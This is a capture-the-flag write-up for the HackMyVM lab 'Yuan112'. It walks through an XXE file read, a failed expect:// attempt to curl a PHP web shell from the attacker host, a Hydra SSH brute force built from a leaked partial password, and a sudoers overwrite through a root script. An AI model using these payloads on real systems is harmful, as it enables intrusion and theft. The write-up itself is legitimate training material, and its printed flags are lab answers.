# HackMyVM - Yuan112 Writeup

## Machine Information

| Category | Details |
|----------|---------|
| Platform | HackMyVM |
| Machine | Yuan112 |
| Difficulty | Easy |
| Operating System | Linux |
| Objective | Obtain User and Root Flags |

---

# Enumeration

The target machine was started and the boot banner revealed the target IP address.

![image alt](1)

**Target IP**

```
192.168.56.126
```

---

## Full TCP Port Scan

The first step was performing a complete TCP port scan to identify every open service.

```bash
nmap -p- 192.168.56.126 -vv
```

![image alt](2)

After discovering the open ports, a service and version detection scan was executed.

```bash
nmap -sC -sV 192.168.56.126
```

The scan revealed the following services.

![image alt](3)

```
22/tcp  OpenSSH 8.4p1 Debian
80/tcp  Apache 2.4.62 Debian
```

### Enumeration Notes

- SSH is available.
- Apache web server is running.
- Website title is **XML Parser**.
- Since the application accepts XML input, XML-based attacks such as XXE immediately become an interesting attack surface.

---

# Web Enumeration

The initial focus shifted toward port **80**.

The application contains an XML parser where arbitrary XML can be submitted.

The host entry was added for convenience.

```bash
sudo nano /etc/hosts
```

```
192.168.56.126    yuan112.hmv
```

Burp Suite was also started to inspect and modify requests.

![image alt](4)

The webpage simply parses whatever XML is supplied.

Applications that parse XML without disabling external entities are frequently vulnerable to **XML External Entity (XXE)** attacks.

---

# Testing XML Parsing

A simple XML document was first submitted to verify parser functionality.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
</stockCheck>
```

The XML was parsed successfully.

However, when intercepted in Burp Suite it became apparent that the request body should be URL encoded before forwarding.

![image alt](5)

---

# XXE Discovery

An XXE payload was prepared to read local files.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&xxe;</productId>
</stockCheck>
```

After URL encoding the payload inside Burp Suite and forwarding the request, the server responded with the contents of **/etc/passwd**.

![image alt](6)

Part of the response:

```
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:107:114::/var/lib/snmp:/bin/false
zabbix:x:108:115::/nonexistent:/usr/sbin/nologin
```

The XXE vulnerability was confirmed.

---

# Additional Enumeration

Before proceeding further, additional web enumeration was performed.

Common directories and files were fuzzed in an attempt to discover hidden endpoints or backup files.

![image alt](7)

Despite thorough enumeration, nothing particularly interesting was discovered.

The attack path therefore returned to abusing the XXE vulnerability.

---

# Attempted XXE RCE

An attempt was made to leverage the **expect://** wrapper for remote command execution.

A simple PHP web shell was prepared locally.

```php
<?php system($_GET["cmd"]); ?>
```

The shell was hosted using Python.

```bash
python3 -m http.server 80
```

An XXE payload was then created attempting to download the shell onto the target.

```xml
<!DOCTYPE email [
<!ENTITY attack SYSTEM "expect://curl http://192.168.56.106:8000/shell.php -o /var/www/html/shell.php">
]>
<email>
<sender>&attack;</sender>
</email>
```

Unfortunately, the parser generated an error instead of executing the payload.

![image alt](8)

This indicated that the PHP **expect** wrapper was unavailable or disabled.

Since direct command execution was unsuccessful, further file disclosure became the primary objective.

---

# Interesting Information Disclosure

Reading **/etc/passwd** revealed an unusual GECOS field for the user **tuf**.

```
tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
```

Unlike normal GECOS values, this looked suspiciously similar to a password with two missing characters.

![image alt](9)

Structure observed:

```
KQNPHFqG??JHcYJossIe
```

Where:

- Prefix

```
KQNPHFqG
```

- Unknown Characters

```
??
```

- Suffix

```
JHcYJossIe
```

Since only two alphanumeric characters were unknown, brute forcing became extremely feasible.

---

# Generating a Targeted Wordlist

Instead of brute forcing an enormous password space, a custom wordlist was generated containing every possible two-character combination.

Character set:

- Uppercase letters
- Lowercase letters
- Digits

Total search space:

```
62² = 3844 passwords
```

Python script:

```bash
python3 -c "import string; chars = string.ascii_letters + string.digits; prefix='KQNPHFqG'; suffix='JHcYJossIe'; [print(f'{prefix}{c1}{c2}{suffix}') for c1 in chars for c2 in chars]" > full_brute.txt
```

Hydra was then used against SSH.

```bash
hydra -l tuf -P full_brute.txt ssh://192.168.56.126
```

![image alt](10)

Hydra successfully recovered the password.

```
Username : tuf
Password : KQNPHFqG6mJHcYJossIe
```

SSH access was obtained.

---

# User Flag

After logging into SSH as **tuf**, the home directory contained the user flag.

```bash
ls
```

```
user.txt
```

Reading the flag:

```bash
cat user.txt
```

```
flag{user-b1e12c74f19aac8e57f6fca1ff472905}
```

---

# Privilege Escalation

The first step after obtaining shell access was checking sudo permissions.

```bash
sudo -l
```

![image alt](11)

Output:

```
User tuf may run:

(ALL) NOPASSWD:
/opt/112.sh
```

Although promising, the script itself was owned by root and was not writable.

---

# Investigating Sudo Configuration

The sudo configuration directory was inspected.

```bash
cat /etc/sudoers.d/zabbix
```

![image alt](12)

Interesting entry:

```
zabbix ALL=(ALL) NOPASSWD:
/usr/bin/nmap -O *
```

This hinted that the machine contained custom automation involving **112.sh** and URL handling.

Further analysis focused on how **112.sh** processed user-supplied input.

---

# Exploiting 112.sh

A fake directory structure matching the expected URL path was created.

```bash
mkdir -p /tmp/https://maze-sec.com/pwn/
```

Inside this directory, a malicious payload was created.

```bash
vim /tmp/https://maze-sec.com/pwn/payload
```

Payload:

```bash
#!/bin/bash

echo 'tuf ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/tuf

chmod 0440 /etc/sudoers.d/tuf

visudo -c
```

The payload was made executable.

```bash
chmod +x "/tmp/https:/maze-sec.com/pwn/payload"
```

The vulnerable script was then executed.

```bash
sudo /opt/112.sh \
-u "https://maze-sec.com/pwn/payload" \
-o /opt/112.sh
```

The response indicated that the supplied URL had been processed.

```
结果已保存到:
/opt/112.sh
```

Executing it again produced:

```
/etc/sudoers: parsed OK

/etc/sudoers.d/tuf: parsed OK
```

The original root-owned script had effectively been overwritten.

Inspecting it showed:

```bash
cat /opt/112.sh
```

```
https://maze-sec.com/pwn/payload is a good url.
```

Although manually executing the script as the normal user generated permission errors, the previous execution via **sudo** had already completed the privileged actions.

![image alt](13)

At this point, full sudo privileges were available.

Simply running:

```bash
sudo -i
```

provided an interactive root shell.

---

# Root Flag

Reading the final flag:

```bash
cat /root/root.txt
```

Output:

```
flag{root-538dc127225a0c97b060b1ff9570390a}
```

---

# Flags

## User Flag

```
flag{user-b1e12c74f19aac8e57f6fca1ff472905}
```

## Root Flag

```
flag{root-538dc127225a0c97b060b1ff9570390a}
```

---

# Attack Chain

```
Nmap Enumeration
        │
        ▼
Apache XML Parser Identified
        │
        ▼
XML External Entity (XXE)
        │
        ▼
Read /etc/passwd
        │
        ▼
Discovered Partial Password
        │
        ▼
Generated Targeted Wordlist
        │
        ▼
Hydra SSH Brute Force
        │
        ▼
SSH Access as tuf
        │
        ▼
sudo -l
        │
        ▼
NOPASSWD Access to /opt/112.sh
        │
        ▼
Abused URL Handling Logic
        │
        ▼
Modified sudo Permissions
        │
        ▼
Root Shell
        │
        ▼
Read root.txt
```

---

# Skills Learned

- Full network enumeration with Nmap
- Manual web application enumeration
- Burp Suite request interception
- XML parsing analysis
- XML External Entity (XXE) exploitation
- Local file disclosure through XXE
- Password pattern analysis
- Targeted wordlist generation using Python
- SSH brute forcing with Hydra
- Linux privilege escalation methodology
- Sudo enumeration
- Analysis of custom privileged scripts
- Exploiting insecure URL handling
- Privilege escalation through sudo misconfiguration

---

# Conclusion

This machine demonstrates how a seemingly harmless XML parser can become a complete system compromise when external entities are enabled. Exploiting XXE allowed arbitrary file disclosure, which exposed a partially hidden SSH password stored within the user's GECOS field. Because only two characters were missing, a highly targeted brute-force attack recovered valid SSH credentials with minimal effort.

Post-exploitation enumeration revealed a root-owned script executable via sudo. By understanding how the script handled user-controlled URLs, it became possible to manipulate its behavior and ultimately gain unrestricted sudo access. With full administrative privileges obtained, the final root flag was successfully retrieved.
